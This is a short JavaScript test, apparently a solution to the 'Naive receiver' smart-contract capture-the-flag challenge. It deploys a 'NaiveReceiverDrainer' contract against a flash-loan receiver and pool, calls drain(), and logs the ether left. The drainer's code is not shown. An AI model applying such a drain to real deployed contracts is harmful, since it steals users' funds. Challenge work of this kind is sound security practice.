...
describe("[Challenge] Naive receiver", function () {
	...
	it("Execution", async function () {
		// Deploy drainer
		const DrainerFactory = await ethers.getContractFactory(
			"NaiveReceiverDrainer"
		);
		const drainer = await DrainerFactory.connect(player).deploy(
			receiver.address,
			pool.address
		);

		const success = await drainer.connect(player).drain();
		const etherLeft = await ethers.provider.getBalance(receiver.address);
		console.log("Remaining Ether", ethers.utils.formatEther(etherLeft));
	});
